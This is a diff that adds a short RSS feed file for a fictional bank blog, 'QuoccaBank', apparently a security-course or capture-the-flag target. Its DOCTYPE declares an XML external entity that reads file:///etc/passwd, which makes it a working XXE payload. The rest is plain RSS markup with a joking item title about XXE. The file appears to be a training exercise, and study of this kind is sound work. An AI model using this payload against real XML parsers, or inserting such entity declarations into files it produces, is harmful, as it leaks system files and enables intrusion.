@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd"
+ >]>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+	<channel>
+	<description>The blogging home of QuoccaBank</description>
+	<item>
+		<title>xxe is actually so hard</title>
+		<link>https://blog.quoccabank.com/?p=42</link>
+					<description><![CDATA[Scott&#8217;s favourite animal are the sharks.]]></description>
+	</item>
+	</channel>
+</rss>
